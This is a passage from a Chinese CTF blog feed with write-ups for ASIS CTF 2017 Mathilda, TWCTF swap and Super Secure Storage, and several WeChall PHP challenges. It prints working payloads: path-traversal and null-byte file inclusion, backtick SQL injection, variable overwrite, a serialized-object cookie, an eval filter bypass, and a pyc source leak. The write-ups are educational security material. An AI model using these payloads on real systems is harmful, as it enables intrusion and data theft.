<p>所以可以知道，如果我们访问：<br><code>http://178.62.48.181/~th1sizveryl0ngus3rn4me/index.php</code> 实际上会被apache服务器解释为 /home/th1sizveryl0ngus3rn4me/public_html/index.php 。由于直接访问不允许，我们可以利用 rooney 的文件包含来读取，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/</div><div class="line">?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/index.ph../p</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/9.png?raw=true" alt=""></p>
<p>所以看起来，我们用了非预期的解法hhh。可以看出同目录下就有flag.php，我们可以直接读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/</div><div class="line">?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/flag.ph../p</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/10.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ASIS&#123;I_l0V3_Us3rD1r_Mpdul3!!&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ASISCTF2017-Mathilda-writeup&lt;br&gt;文件包含 apache配置userdir&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>TWCTF 2017-swap-writeup</title>
    <link href="http://chybeta.github.io/2017/09/09/TWCTF-2017-swap-writeup/"/>
    <id>http://chybeta.github.io/2017/09/09/TWCTF-2017-swap-writeup/</id>
    <published>2017-09-09T06:51:02.000Z</published>
    <updated>2017-09-11T08:26:23.370Z</updated>
    
    <content type="html"><![CDATA[<p>TWCTF 2017-swap-writeup<br>PLT GOT<br><a id="more"></a></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/pwn/ctf/twctf$ ./swap</div><div class="line">==============================================</div><div class="line">1. Set addrsses</div><div class="line">2. Swap both addrress of value</div><div class="line">0. Exit</div><div class="line">Your choice:</div></pre></td></tr></table></figure>
<p>程序有三个功能。选1是设置两个地址，选2是交换两个地址上的值，选0是退出。用IDA反汇编后。</p>
<p>main函数    ：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">void</span> *v4; <span class="comment">// rax@6</span></div><div class="line">  <span class="keyword">void</span> *v5; <span class="comment">// rax@6</span></div><div class="line">  <span class="keyword">void</span> *src; <span class="comment">// [sp+20h] [bp-20h]@0</span></div><div class="line">  <span class="keyword">void</span> *v7; <span class="comment">// [sp+28h] [bp-18h]@0</span></div><div class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+30h] [bp-10h]@7</span></div><div class="line">  __int64 v9; <span class="comment">// [sp+38h] [bp-8h]@1</span></div><div class="line"></div><div class="line">  v9 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  initialize(*(_QWORD *)&amp;argc, argv, envp);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">    &#123;</div><div class="line">      print_menu(*(_QWORD *)&amp;argc);</div><div class="line">      v3 = read_int(*(_QWORD *)&amp;argc);</div><div class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Please input 1st addr"</span>);</div><div class="line">      LODWORD(v4) = read_ll(<span class="string">"Please input 1st addr"</span>);</div><div class="line">      src = v4;</div><div class="line">      *(_QWORD *)&amp;argc = <span class="string">"Please input 2nd addr"</span>;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Please input 2nd addr"</span>);</div><div class="line">      LODWORD(v5) = read_ll(<span class="string">"Please input 2nd addr"</span>);</div><div class="line">      v7 = v5;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">memcpy</span>(&amp;dest, src, <span class="number">8u</span>LL);</div><div class="line">      <span class="built_in">memcpy</span>(src, v7, <span class="number">8u</span>LL);</div><div class="line">      *(_QWORD *)&amp;argc = v7;</div><div class="line">      <span class="built_in">memcpy</span>(v7, &amp;dest, <span class="number">8u</span>LL);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !v3 )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Bye."</span>);</div><div class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中有个read_ll()，反汇编后代码为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">__<span class="function">int64 <span class="title">read_ll</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  __int64 result; <span class="comment">// rax@1</span></div><div class="line">  __int64 v1; <span class="comment">// rcx@1</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+10h] [bp-110h]@1</span></div><div class="line">  __int64 v3; <span class="comment">// [sp+118h] [bp-8h]@1</span></div><div class="line"></div><div class="line">  v3 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>uLL);</div><div class="line">  result = atoll(&amp;buf);</div><div class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v3;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>晚上写完后再贴上来hh</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;TWCTF 2017-swap-writeup&lt;br&gt;PLT GOT&lt;br&gt;
    
    </summary>
    
      <category term="writeup:bin" scheme="http://chybeta.github.io/categories/writeup-bin/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="pwn" scheme="http://chybeta.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>WeChall-PHP-writeup</title>
    <link href="http://chybeta.github.io/2017/09/08/WeChall-PHP-writeup/"/>
    <id>http://chybeta.github.io/2017/09/08/WeChall-PHP-writeup/</id>
    <published>2017-09-07T16:28:43.000Z</published>
    <updated>2017-09-08T16:17:27.736Z</updated>
    
    <content type="html"><![CDATA[<p>WeChall PHP关。<br><a id="more"></a></p>
<h1 id="No-Escape"><a href="#No-Escape" class="headerlink" title="No Escape"></a>No Escape</h1><p>题目源码：<a href="https://www.wechall.net/challenge/no_escape/index.php?highlight=christmas" target="_blank" rel="external">https://www.wechall.net/challenge/no_escape/index.php?highlight=christmas</a></p>
<p>流程大概如下：</p>
<ol>
<li>点击vote按钮后，调用noesc_voteup()</li>
<li>noesc_voteup()中，执行update操作后，调用noesc_stop100()</li>
<li>noesc_stop100()，先检查票数是否为111，若是则通过。接着检查票数是否大于等于100，若是则清零。</li>
</ol>
<p>也就是说，通过vote的方法是达不到票数为111的。看一下noesc_voteup()的第60行左右：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$who = mysql_real_escape_string($who);</div><div class="line">$query = <span class="string">"UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1"</span>;</div></pre></td></tr></table></figure></p>
<p>mysql_real_escape_string()会对如下字符进行转义，即在前面加上反斜杠：</p>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>‘</li>
<li>“</li>
<li>\x1a<br>该函数在php5.5.0后废弃，php7.0.0开始移除。</li>
</ul>
<p>在本题中，update的操作是用反引号来包含，所以如果我们传入参数为 <code>bill`=111 -- +</code><br>显示的sql语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE noescvotes SET `bill`=111 -- `=`bill`=111 -- `+1 WHERE id=1</div></pre></td></tr></table></figure></p>
<p>将bill票数设置为111，并且通过<code>--</code>使得后面注释掉。从而成功注入。</p>
<p>访问：<a href="https://www.wechall.net/challenge/no_escape/index.php" target="_blank" rel="external">https://www.wechall.net/challenge/no_escape/index.php</a><br>?vote_for=bill`=111 — +</p>
<p>通关。</p>
<h1 id="Training-PHP-LFI"><a href="#Training-PHP-LFI" class="headerlink" title="Training: PHP LFI"></a>Training: PHP LFI</h1><p>漏洞代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$code = <span class="string">'$filename = \'pages/\'.(isset($_GET["file"])?$_GET["file"]:"welcome").\'.html\';'</span>;</div><div class="line">$code_emulate_pnb = <span class="string">'$filename = Common::substrUntil($filename, "\\0");'</span>; <span class="comment"># Emulate Poison Null Byte for PHP&gt;=5.3.4</span></div><div class="line">$code2 = <span class="string">'include $filename;'</span></div><div class="line"></div><div class="line">...</div><div class="line"><span class="keyword">eval</span>($code.$code_emulate_pnb); <span class="comment"># eval the first line</span></div><div class="line">...</div><div class="line"><span class="keyword">if</span> (lfiIsSafeDir($filename) === <span class="keyword">true</span>) &#123; <span class="keyword">eval</span>($code2); &#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>可以看到它自己模拟了一个<code>\0</code>的字符串截止符。为了能包含solution.php，可以利用00截断来bypass掉源代码中会附加的<code>.html</code>。</p>
<p>最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00</div></pre></td></tr></table></figure></p>
<h1 id="PHP-0817"><a href="#PHP-0817" class="headerlink" title="PHP 0817"></a>PHP 0817</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'which'</span>]))</div><div class="line">&#123;</div><div class="line">        $which = $_GET[<span class="string">'which'</span>];</div><div class="line">        <span class="keyword">switch</span> ($which)        &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">                <span class="keyword">require_once</span> $which.<span class="string">'.php'</span>;                <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">                <span class="keyword">echo</span> GWF_HTML::error(<span class="string">'PHP-0817'</span>, <span class="string">'Hacker NoNoNo!'</span>, <span class="keyword">false</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>目标是包含solution.php。这里考察php弱类型比较。我们传入的which为字符串，在进行swich比较时字符串会被转化成0，然后再与数字0,1,2进行比较。所以payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.wechall.net/challenge/php0817/index.php?which=solution</div></pre></td></tr></table></figure></p>
<h1 id="Training-Register-Globals"><a href="#Training-Register-Globals" class="headerlink" title="Training: Register Globals"></a>Training: Register Globals</h1><p>这里可以看到源代码： <a href="https://www.wechall.net/challenge/training/php/globals/index.php?highlight=christmas" target="_blank" rel="external">https://www.wechall.net/challenge/training/php/globals/index.php?highlight=christmas</a></p>
<p>其中这段代码存在变量覆盖漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">foreach ($_GET as $k =&gt; $v) &#123;</div><div class="line">$$k = $v;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>要使<code>strtolower($login[0]) === &#39;admin&#39;</code>，可以通过GET传入<code>login[0]=admin</code>。通过上面的代码将会执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$login[0]=admin;</div></pre></td></tr></table></figure></p>
<p>从而满足条件。</p>
<p>username和password可以随便填写。</p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin</div></pre></td></tr></table></figure></p>
<h1 id="Are-you-serial"><a href="#Are-you-serial" class="headerlink" title="Are you serial"></a>Are you serial</h1><p>这题考察php反序列化。</p>
<p>在 <a href="https://www.wechall.net/challenge/are_you_serial/index.php?ShowSource=code.php" target="_blank" rel="external">https://www.wechall.net/challenge/are_you_serial/index.php?ShowSource=code.php</a> 中第四十行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (false !== ($user = unserialize(Common::getCookie(&apos;serial_user&apos;, &apos;&apos;))))</div></pre></td></tr></table></figure></p>
<p>从cookie中取出对应的字段，并进行反序列化。</p>
<p>而在 <a href="https://www.wechall.net/challenge/are_you_serial/index.php?ShowSource=SERIAL_Solution.php" target="_blank" rel="external">https://www.wechall.net/challenge/are_you_serial/index.php?ShowSource=SERIAL_Solution.php</a> 中有一个SERIAL_Solution的类，里面的_wakeup 方法可以直接通过此关。</p>
<p>所以做法就是生成一个序列串，通过cookie传入，然后反序列化后生成SERIAL_Solution类，并自动调用_wakeup方法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SERIAL_Solution</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line">        &#123;                <span class="keyword">if</span> (<span class="keyword">false</span> === ($chall = WC_Challenge::getByTitle(GWF_PAGE_TITLE)))</div><div class="line">                &#123;</div><div class="line">                        $chall = WC_Challenge::dummyChallenge(GWF_PAGE_TITLE, <span class="number">2</span>, <span class="string">'challenge/are_you_serial/index.php'</span>);</div><div class="line">                &#125;</div><div class="line">                $chall-&gt;onChallengeSolved(GWF_Session::getUserID());        </div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$tmp = <span class="keyword">new</span> SERIAL_Solution();</div><div class="line"><span class="keyword">echo</span> serialize($tmp);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>得到： O:15:”SERIAL_Solution”:0:{} 。修改cookie：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170908/1.png?raw=true" alt=""></p>
<h1 id="PHP-0819"><a href="#PHP-0819" class="headerlink" title="PHP 0819"></a>PHP 0819</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// closure, because of namespace!</span></div><div class="line">$challenge = <span class="function"><span class="keyword">function</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">        $f = Common::getGetString(<span class="string">'eval'</span>);        $f = str_replace(<span class="keyword">array</span>(<span class="string">'`'</span>, <span class="string">'$'</span>, <span class="string">'*'</span>, <span class="string">'#'</span>, <span class="string">':'</span>, <span class="string">'\\'</span>, <span class="string">'"'</span>, <span class="string">"'"</span>, <span class="string">'('</span>, <span class="string">')'</span>, <span class="string">'.'</span>, <span class="string">'&gt;'</span>), <span class="string">''</span>, $f);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((strlen($f) &gt; <span class="number">13</span>) || (<span class="keyword">false</span> !== stripos($f, <span class="string">'return'</span>)))</div><div class="line">        &#123;</div><div class="line">                <span class="keyword">die</span>(<span class="string">'sorry, not allowed!'</span>);        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">try</span></div><div class="line">        &#123;</div><div class="line">                <span class="keyword">eval</span>(<span class="string">"\$spaceone = $f"</span>);        &#125;</div><div class="line">        <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)</div><div class="line">        &#123;</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> ($spaceone === <span class="string">'1337'</span>);</div><div class="line">&#125;;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>分析一下流程，通过get的eval参数传入并赋值到变量<code>$f</code>，然后经过str_replace()的过滤，要求长度小于13，并且不包含字符串return，接着执行eval。</p>
<p>目标是让结果返回True。最后一行<code>$spaceone === &#39;1337&#39;</code>，不存在弱类型比较，要求类型和值都得相等。看一下str_replace()，过滤了单引号，双引号，所以如果直接get传参<code>index.php?eval=&#39;1337&#39;</code>进去，在经过过滤后，到最后会变为<code>$spaceone=1337</code>，是一个数值类型而非字符串。</p>
<p>查一下php手册；<a href="http://php.net/manual/zh/language.types.string.php" target="_blank" rel="external">http://php.net/manual/zh/language.types.string.php</a> 。除了用单引号，双引号表示字符串外，还有以下两种：</p>
<ul>
<li>heredoc 语法结构</li>
<li>nowdoc 语法结构</li>
</ul>
<p>用一个简单的例子，对heredoc语法结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$f = &lt;&lt;&lt;q</div><div class="line">1337</div><div class="line">q;</div></pre></td></tr></table></figure></p>
<p><code>&lt;&lt;&lt;</code>后面要提供一个标识符，这里为<code>q</code>，然后换行。接下来是字符串本身，这里为<code>1337</code>。结束时所引用的标识符必须在该行的第一列，即标识符<code>q</code>要在开头。标识符的命名只能包含字母、数字和下划线，并且必须以字母和下划线作为开头。在结束标识符这行除了可能有一个分号（;）外，绝对不能包含其它字符，更重要的是结束标识符的前面必须是个被本地操作系统认可的换行，比如在 UNIX 和 Mac OS X 系统中是 \n，而结束定界符（可能其后有个分号）之后也必须紧跟一个换行。</p>
<p>所以在本题中，我们构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.wechall.net/challenge/space/php0819/index.php?eval=&lt;&lt;&lt;q%0a1337%0aq;%0a</div></pre></td></tr></table></figure></p>
<p>注意 %0a 即换行。</p>
<p>而nowdoc语法结构中，由于<code>&lt;&lt;&lt;</code>后的标识符要用单引号括起来，所以这里无法利用，不展开。</p>
<h1 id="Host-ME"><a href="#Host-ME" class="headerlink" title="Host ME"></a>Host ME</h1><p>……未果。</p>
<h1 id="PHP-0818"><a href="#PHP-0818" class="headerlink" title="PHP 0818"></a>PHP 0818</h1><p>题目要求我们传入的每一位不允许是1到9的数字。而。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">3735929054</span>)</div><div class="line"><span class="string">'0xdeadc0de'</span></div></pre></td></tr></table></figure></p>
<p>恰好3735929054的十六进制为0xdeadc0de，仅出现字母与数字0，因此可以绕过检测。</p>
<p>最后与3735929054进行<code>==</code>比较，这里存在php弱类型比较问题，即”0xdeadc0de” == “3735929054”。</p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">answer=0xdeadc0de</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;WeChall PHP关。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>TWCTF 2017-Super Secure Storage-writeup</title>
    <link href="http://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/"/>
    <id>http://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/</id>
    <published>2017-09-05T07:47:56.000Z</published>
    <updated>2017-09-05T13:14:12.290Z</updated>
    
    <content type="html"><![CDATA[<p>TWCTF 2017-Super Secure Storage-writeup<br>python缓存 RC4 爆破</p>
<p>重点：这是web题，不是Crypto<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://s3.chal.ctf.westerns.tokyo/#/</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/1.png?raw=true" alt=""></p>
<p>先观察一下基本的功能。你可以输入数据，和一个密钥，发送到服务器端后会加密返回加密后的数据和对应的id。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/2.png?raw=true" alt=""></p>
<p>用扫描器扫后发现有robots.txt，访问后如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Disallow: /super_secret_secure_shared_directory_for_customer/</div></pre></td></tr></table></figure></p>
<p>接着访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://s3.chal.ctf.westerns.tokyo/super_secret_secure_shared_directory_for_customer/</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/3.png?raw=true" alt=""></p>
<p>securestorage.conf的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">  listen 80;</div><div class="line">  server_name s3.chal.ctf.westerns.tokyo;</div><div class="line">  root /srv/securestorage;</div><div class="line">  index index.html;</div><div class="line"></div><div class="line">  location / &#123;</div><div class="line">    try_files $uri $uri/ @app;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  location @app &#123;</div><div class="line">    include uwsgi_params;</div><div class="line">    uwsgi_pass unix:///tmp/uwsgi.securestorage.sock;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  location ~ (\.py|\.sqlite3)$ &#123;</div><div class="line">    deny all;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>securestorage.ini的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[uwsgi]</div><div class="line">chdir = /srv/securestorage</div><div class="line">uid = www-data</div><div class="line">gid = www-data</div><div class="line">module = app</div><div class="line">callable = app</div><div class="line">socket = /tmp/uwsgi.securestorage.sock</div><div class="line">chmod-socket = 666</div><div class="line">vacuum = true</div><div class="line">die-on-term = true</div><div class="line">logto = /var/log/uwsgi/securestorage.log</div><div class="line">processes = 8</div><div class="line"></div><div class="line">env = SECRET_KEY=**CENSORED**</div><div class="line">env = KEY=**CENSORED**</div><div class="line">env = FLAG=**CENSORED**</div></pre></td></tr></table></figure></p>
<p>从以上文件，我们可以知道这是一个python服务端程序，主程序为app.py，直接访问<a href="http://s3.chal.ctf.westerns.tokyo/app.py" target="_blank" rel="external">http://s3.chal.ctf.westerns.tokyo/app.py</a> 会返回403 Forbidden。</p>
<p>在 python-web 应用中，当前目录下， <code>.py</code>文件生成的<code>pyc</code>文件会被存储在  <code>__pycache__</code>文件夹中，并以 <code>.cpython-XX.pyc</code> 为扩展名，其中的 XX 与 CPython 版本有关。比如app.py，其对应的 pyc文件路径为 <code>__pycache__/app.cpython-35.pyc</code>（这里的35是我假设的）。我们尝试访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://s3.chal.ctf.westerns.tokyo/__pycache__/app.cpython-35.pyc</div></pre></td></tr></table></figure></p>
<p>发现成功的下载了pyc文件，然后用工具将其反编译回源码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div 